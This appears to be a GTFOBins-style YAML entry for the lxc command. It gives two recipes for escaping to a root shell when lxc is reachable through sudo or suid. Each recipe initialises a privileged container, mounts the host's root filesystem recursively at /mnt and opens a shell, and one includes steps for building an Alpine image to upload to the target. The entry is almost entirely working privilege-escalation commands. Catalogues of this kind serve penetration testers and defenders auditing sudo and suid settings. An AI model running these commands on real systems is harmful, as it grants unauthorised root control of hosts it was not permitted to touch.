---
functions:
  shell:
  - code: |-
      lxc init ubuntu:16.04 x -c security.privileged=true
      lxc config device add x x disk source=/ path=/mnt/ recursive=true
      lxc start x
      lxc exec x /bin/sh
    comment: |-
      The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.
    contexts:
      sudo:
      suid:
  - code: |-
      lxc image import ./alpine*.tar.gz --alias x
      lxc init x x -c security.privileged=true
      lxc config device add x x disk source=/ path=/mnt/ recursive=true
      lxc start x
      lxc exec x /bin/sh
    comment: |-
      This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):

      ```
      git clone https://github.com/saghul/lxd-alpine-builder
      cd lxd-alpine-builder
      sudo ./build-alpine -a i686
      ```
    contexts:
      sudo:
      suid:
...
